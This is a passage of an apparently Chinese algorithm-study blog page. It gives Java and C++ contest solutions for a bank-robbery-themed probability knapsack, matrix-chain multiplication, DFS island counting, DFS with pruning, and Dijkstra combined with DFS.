class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">int</span> N = <span class="number">50005</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">double</span> [] dp = <span class="keyword">new</span> <span class="keyword">double</span> [N];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> [] value = <span class="keyword">new</span> <span class="keyword">int</span> [N];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">double</span> [] per = <span class="keyword">new</span> <span class="keyword">double</span> [N];</span><br><span class="line"><span class="comment">//static double per[]=new double [N+1];</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner in = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> BufferedInputStream(System.in));</span><br><span class="line"><span class="keyword">int</span> times = in.nextInt();</span><br><span class="line"><span class="keyword">while</span>(times!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">Arrays.fill(value, <span class="number">0</span>);</span><br><span class="line">Arrays.fill(per, <span class="number">0.0</span>);</span><br><span class="line">Arrays.fill(dp, <span class="number">0.0</span>);</span><br><span class="line">dp[<span class="number">0</span>]=<span class="number">1.0</span>;</span><br><span class="line"><span class="keyword">double</span> p = in.nextDouble();</span><br><span class="line">p=<span class="number">1.0</span>-p;</span><br><span class="line"><span class="keyword">int</span> sum = in.nextInt();</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=sum;i++)</span><br><span class="line">&#123;</span><br><span class="line">value[i]=in.nextInt();</span><br><span class="line">max+=value[i];</span><br><span class="line">per[i]=in.nextDouble();</span><br><span class="line">per[i]=<span class="number">1.0</span>-per[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*动态方程变化 多抢一个银行，其钱数必将转化为概率的乘积，所以动态方程也要做出改变。</span></span><br><span class="line"><span class="comment"> 最后遍历，剩余的钱数越多，说明所抢的钱数越少，</span></span><br><span class="line"><span class="comment"> 逃跑几率越大。所以从大到小遍历背包容量，</span></span><br><span class="line"><span class="comment"> 一旦大于p，即为最大概率跳出。*/</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=sum;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=max;j&gt;=value[i];j--)</span><br><span class="line">dp[j]=Math.max(dp[j], dp[j-value[i]]*per[i]);</span><br><span class="line"><span class="comment">/*使用钱数作为背包容量，通过1-p，即使用逃脱率，连续抢劫，逃脱率相乘则下降，这样才符合逻辑*/</span></span><br><span class="line"><span class="comment">/*如，被抓率0.3,0.2抢劫两个为0.06，抢劫的越多被抓的几率越少这是不正常的，则逆向思维使用逃脱率*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=max;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(dp[i]&gt;=p)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">times--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩阵相乘-Matrix-Power"><a href="#矩阵相乘-Matrix-Power" class="headerlink" title="矩阵相乘|Matrix Power"></a>矩阵相乘|Matrix Power</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 1050 </span></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system("pause") or input loop */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(x,y) x&lt;y?x:y</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> M[MAX][MAX];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> mart[MAX];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> t;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, k;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">2</span>; j &lt;= n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = j - <span class="number">1</span>, M[i][i] = M[j][j] = <span class="number">0</span>; i&gt;<span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (k = i; k&lt;j; k++)</span><br><span class="line">&#123;</span><br><span class="line">t = M[i][k] + M[k + <span class="number">1</span>][j] + mart[i - <span class="number">1</span>] * mart[k] * mart[j];</span><br><span class="line">M[i][j] = <span class="built_in">min</span>(t, M[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(M, <span class="number">0x3f</span>, <span class="keyword">sizeof</span>(M));</span><br><span class="line"><span class="keyword">int</span> i, n;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; mart[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">find</span>(n);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; M[<span class="number">1</span>][n];</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="深度搜索-Deep-Search"><a href="#深度搜索-Deep-Search" class="headerlink" title="深度搜索|Deep Search"></a>深度搜索|Deep Search</h3><h4 id="常规DFS-island-problem"><a href="#常规DFS-island-problem" class="headerlink" title="常规DFS(island problem)"></a>常规DFS(island problem)</h4><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20201027165154352.png" alt="image-20201027165154352" style="zoom:80%;" /><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="keyword">char</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//边界条件判断</span></span><br><span class="line">    <span class="keyword">if</span> (grid == <span class="keyword">null</span> || grid.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//统计岛屿的个数</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//两个for循环遍历每一个格子</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; grid.length; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">            <span class="comment">//只有当前格子是1才开始计算</span></span><br><span class="line">            <span class="keyword">if</span> (grid[i][j] == <span class="string">'1'</span>) &#123;</span><br><span class="line">                <span class="comment">//如果当前格子是1，岛屿的数量加1</span></span><br><span class="line">                count++;</span><br><span class="line">                <span class="comment">//然后通过dfs把当前格子的上下左右4</span></span><br><span class="line">                <span class="comment">//个位置为1的都要置为0，因为他们是连着</span></span><br><span class="line">                <span class="comment">//一起的算一个岛屿，</span></span><br><span class="line">                dfs(grid, i, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//最后返回岛屿的数量</span></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个方法会把当前格子以及他邻近的为1的格子都会置为1</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span>[][] grid, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//边界条件判断，不能越界</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= grid.length || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].length || grid[i][j] == <span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//把当前格子置为0，然后再从他的上下左右4个方向继续遍历</span></span><br><span class="line">    grid[i][j] = <span class="string">'0'</span>;</span><br><span class="line">    dfs(grid, i - <span class="number">1</span>, j); <span class="comment">//上</span></span><br><span class="line">    dfs(grid, i + <span class="number">1</span>, j); <span class="comment">//下</span></span><br><span class="line">    dfs(grid, i, j + <span class="number">1</span>); <span class="comment">//左</span></span><br><span class="line">    dfs(grid, i, j - <span class="number">1</span>); <span class="comment">//右</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="DFS-剪枝"><a href="#DFS-剪枝" class="headerlink" title="DFS+剪枝"></a>DFS+剪枝</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> sum;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> max = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> min = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> arr[];</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> vis[];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> pos, <span class="keyword">int</span> nowlen, <span class="keyword">int</span> target, <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">1</span>)<span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(count==n) &#123;flag=<span class="number">1</span>;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=pos;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i]&amp;&amp;nowlen+arr[i]&lt;=target)</span><br><span class="line">&#123;</span><br><span class="line">vis[i]=<span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">if</span>(nowlen+arr[i]==target)</span><br><span class="line">dfs(<span class="number">1</span>, <span class="number">0</span>, target, count+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">dfs(i+<span class="number">1</span>, nowlen+arr[i], target, count+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">vis[i]=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">1</span>)<span class="keyword">return</span>;<span class="comment">//找到就返回</span></span><br><span class="line"><span class="keyword">if</span>(nowlen==<span class="number">0</span>)<span class="keyword">return</span>;<span class="comment">//因为起点是从nowlen=0，所以一开始的dfs才开始选用第一根木棍，如果前面的flag没满足，则</span></span><br><span class="line"><span class="comment">//则证明选用了第一根但是发现第一根没有用得上，说明这个target是不可能成立的，因为有一根没用</span></span><br><span class="line"><span class="comment">//所以直接返回，寻找下一个target</span></span><br><span class="line"><span class="keyword">while</span>(i&lt;n&amp;&amp;arr[i]==arr[i+<span class="number">1</span>])i++;</span><br><span class="line"><span class="comment">/*如果存在某些nowlen并不是为0，即为正在拼凑的过程中，前面的已拼凑的加上这一根没有满足，则说明跟这一个</span></span><br><span class="line"><span class="comment">木棍相同的木棍肯定也在这个序列中无法被选中，也不用再去DFS了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">Scanner in = <span class="keyword">new</span> Scanner(<span class="keyword">new</span> BufferedInputStream(System.in));</span><br><span class="line"><span class="keyword">while</span> (in.hasNext()) &#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">n = in.nextInt();</span><br><span class="line"><span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">arr = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">vis = <span class="keyword">new</span> <span class="keyword">boolean</span>[n + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">arr[i] = in.nextInt();</span><br><span class="line">sum += arr[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> k = i;</span><br><span class="line"><span class="keyword">for</span> (j = i + <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="keyword">if</span> (arr[j] &gt; arr[i])</span><br><span class="line">k = j;</span><br><span class="line"><span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">arr[k] ^= arr[i];</span><br><span class="line">arr[i] ^= arr[k];</span><br><span class="line">arr[k] ^= arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">max = arr[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> temp = max;</span><br><span class="line"><span class="keyword">while</span> (temp &lt;= sum) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp == sum)</span><br><span class="line">&#123;System.out.println(sum);<span class="keyword">break</span>;&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (sum % temp != <span class="number">0</span>) &#123;<span class="comment">//剪枝1，target必须可以被Sum整除</span></span><br><span class="line">temp++;</span><br><span class="line">&#125;</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line">dfs(<span class="number">1</span>, <span class="number">0</span>, temp, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">&#123;System.out.println(temp);<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">temp++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Dijkstra-DFS"><a href="#Dijkstra-DFS" class="headerlink" title="Dijkstra+DFS"></a>Dijkstra+DFS</h4><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1142" target="_blank" rel="noopener">例题|Example</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*小记:在第二个vis[j]的问题上，由于DJ算法是取未取过的，最小的距离值。所以求原点到某个点的距离的时候</span></span><br><span class="line"><span class="comment">如果一开始他们之间的直接距离就是最小的话，那么之后在经过各种别的点的出度到达当前点的距离肯定不会有直接</span></span><br><span class="line"><span class="comment">的这个距离大。所以也就没必要更新，（因为距离不可能为0），而如果距离大的话，那么这个点到最后才会更新。</span></span><br><span class="line"><span class="comment">也可以保证跟之前很多点比较之后最后的取值会是最小值*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> dp[];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> dis[];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> vis[];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> map[][];</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> vsum,road;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> INF=<span class="number">0x3f3f3f3f</span>;<span class="comment">//3f最好，0x7fffffff太大了，不适合DJ算法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> N=<span class="number">1010</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dj</span><span class="params">(<span class="keyword">int</span> start)</span><span class="comment">//地杰斯特拉</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i,j,k=<span class="number">0</span>;</span><br><span class="line">        Arrays.fill(vis, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=vsum;i++)</span><br><span class="line">            dis[i]=map[start][i];</span><br><span class="line">        dis[start]=<span class="number">0</span>;</span><br><span class="line">        vis[start]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=vsum;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> temp=INF;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=vsum;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(vis[j]!=<span class="number">1</span>&amp;&amp;dis[j]&lt;temp)</span><br><span class="line">                    temp=dis[k=j];<span class="comment">//这里就是取最小的值，千万不能加Break；</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(temp==INF) <span class="keyword">break</span>;</span><br><span class="line">            vis[k]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=vsum;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(vis[j]!=<span class="number">1</span>&amp;&amp;dis[j]&gt;dis[k]+map[k][j])<span class="comment">//这里的vis[j]!=1是为了剪枝，因为已经被vis过的顶点</span></span><br><span class="line">      <span class="comment">//根据算法的巧妙性，之后要是还有其他出度关系到该点</span></span><br><span class="line"><span class="comment">//，那么他的距离一定比已经vis过的所记录的值要大，也就没必要更新</span></span><br><span class="line"></span><br><span class="line">                    dis[j]=dis[k]+map[k][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(v==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(dp[v]!=-<span class="number">1</span>) <span class="keyword">return</span> dp[v];</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=vsum;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(map[v][i]!=INF&amp;&amp;dis[v]&gt;dis[i])</span><br><span class="line">                sum+=dfs(i);</span><br><span class="line">        &#125;</span><br><span class="line">        dp[v]=sum;</span><br><span class="line">        <span class="keyword">return</span> dp[v];</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Scanner in=<span class="keyword">new</span> Scanner(<span class="keyword">new</span> BufferedInputStream(System.in));</span><br><span class="line">        <span class="keyword">while</span>(in.hasNext())</span><br><span class="line">        &#123;</span><br><span class="line">            vsum=in.nextInt();</span><br><span class="line">            <span class="keyword">if</span>(vsum==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">            road=in.nextInt();</span><br><span class="line">            dis=<span class="keyword">new</span> <span class="keyword">int</span>[vsum+<span class="number">1</span>];</span><br><span class="line">            dp=<span class="keyword">new</span> <span class="keyword">int</span>[vsum+<span class="number">1</span>];</span><br><span class="line">            vis=<span class="keyword">new</span> <span class="keyword">int</span>[vsum+<span class="number">1</span>];</span><br><span class="line">            map=<span class="keyword">new</span> <span class="keyword">int</span>[vsum+<span class="number">1</span>][vsum+<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> i,j;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=vsum;i++)</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=vsum;j++)</span><br><span class="line">                    map[i][j]=(i==j?<span class="number">0</span>:INF);</span><br><span class="line">            Arrays.fill(dp,-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">int</span> u,v,w;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=road;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                u=in.nextInt();v=in.nextInt();w=in.nextInt();</span><br><span class="line">                 </span><br><span class="line">                map[u][v]=w;map[v][u]=w;</span><br><span class="line">            &#125;</span><br><span class="line">            dj(<span class="number">2</span>);</span><br><span class="line">            System.out.println(dfs(<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Bellman-Ford-DFS"><a href="#Bellman-Ford-DFS" class="headerlink" title="Bellman-Ford+DFS"></a>Bellman-Ford+DFS</h4><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=1142" target="_blank" rel="noopener">例题|Example</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 